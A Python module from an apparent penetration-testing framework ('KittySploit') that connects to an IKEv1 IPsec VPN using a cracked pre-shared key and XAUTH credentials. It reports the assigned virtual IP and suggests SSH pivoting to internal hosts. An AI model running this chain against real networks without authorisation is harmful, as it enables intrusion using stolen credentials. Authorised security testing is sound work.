#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from kittysploit import *
from lib.protocols.ipsec.ike import Ike
from lib.protocols.ipsec.vpn import IpsecVpn


class Module(Auxiliary, Ike, IpsecVpn):

    __info__ = {
        "name": "IKEv1 IPsec VPN connect (PSK + XAUTH)",
        "description": (
            "Brings up an IKEv1 IPsec VPN tunnel using a cracked or known pre-shared key and "
            "XAUTH user credentials. Generates a temporary strongSwan stroke configuration, "
            "runs `ipsec up`, and reports the assigned virtual IP. Requires root and a local "
            "strongSwan/libreswan install. Chain after ike_psk_capture + hashcat, then use "
            "listeners/multi/ssh_client against hosts reachable through the tunnel."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://docs.strongswan.org/docs/5.9/config/IKEv1.html",
            "RFC 2409",
            "https://github.com/royhills/ike-scan",
        ],
        "modules": [
            "listeners/multi/ssh_client",
        ],
        "tags": [
            "ipsec",
            "ike",
            "vpn",
            "xauth",
            "psk",
            "admin",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "credential_access"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "endpoints"],
        },
    }

    def check(self):
        profile = self._vpn_profile()
        if not profile:
            return {
                "vulnerable": False,
                "reason": "Missing target, group_id, psk, or username",
                "confidence": "low",
            }

        ipsec_bin = self._vpn_ipsec_bin()
        if not ipsec_bin:
            return {
                "vulnerable": False,
                "reason": "strongSwan `ipsec` binary not found on operator host",
                "confidence": "low",
            }

        if hasattr(os, "geteuid") and os.geteuid() != 0:
            return {
                "vulnerable": True,
                "reason": "Prerequisites met but root is required to install kernel IPsec policy",
                "confidence": "medium",
                "details": f"ipsec={ipsec_bin}; group={profile.group_id}",
            }

        probe = self.ike_probe(exchange="aggressive", id_value=profile.group_id.lstrip("@"))
        if probe.get("status") == "ok":
            parsed = probe.get("parsed") or {}
            xauth = parsed.get("supports_xauth")
            return {
                "vulnerable": True,
                "reason": "IKE endpoint reachable; VPN parameters present",
                "confidence": "high" if xauth else "medium",
                "details": f"xauth_hint={xauth}; {probe.get('reason')}",
            }

        return {
            "vulnerable": True,
            "reason": "VPN parameters present; IKE probe did not confirm endpoint (may still work)",
            "confidence": "low",
            "details": probe.get("reason"),
        }

    def run(self):
        profile = self._vpn_profile()
        if not profile:
            print_error("Set target, group_id, psk, username, and password")
            return False

        ipsec_bin = self._vpn_ipsec_bin()
        if not ipsec_bin:
            print_error("strongSwan/libreswan not found — install strongswan-starter (ipsec binary)")
            return False

        if hasattr(os, "geteuid") and os.geteuid() != 0:
            print_error("This module must run as root (sudo) to configure kernel IPsec")
            return False

        host = profile.host
        port = profile.port
        print_info(f"Connecting IKEv1 VPN to {host}:{port}")
        print_info(f"Group ID: {profile.group_id} | XAUTH user: {profile.username}")
        print_info(f"Mode: {'Aggressive' if profile.aggressive else 'Main'} | NAT-T: {profile.nat_t}")
        print_info(f"Using {ipsec_bin}")
        print_info("=" * 72)

        result = self.vpn_connect()
        status = result.get("status")

        if status != "connected":
            print_error(result.get("reason") or "VPN connection failed")
            logs = str(result.get("logs") or "").strip()
            if logs:
                print_status("strongSwan output:")
                print_info(logs)
            work_dir = result.get("work_dir")
            if work_dir:
                print_info(f"Config left in {work_dir} (set keep_config true to retain on success too)")
            return False

        print_success(result.get("reason") or "VPN connected")
        virtual_ip = str(result.get("virtual_ip") or "").strip()
        if virtual_ip:
            print_success(f"Assigned virtual IP: {virtual_ip}")

        route_msg = str(result.get("route") or "").strip()
        if route_msg:
            print_info(route_msg)

        work_dir = result.get("work_dir")
        if work_dir:
            print_info(f"Generated configs: {work_dir}/ipsec.conf , {work_dir}/ipsec.secrets")

        hint = str(result.get("disconnect_hint") or "").strip()
        if hint:
            print_status(f"Teardown: {hint}")

        print_info(
            "Next: scan or SSH to internal hosts, e.g. "
            "`use listeners/multi/ssh_client` with rhost set to the target inside the VPN"
        )
        return True
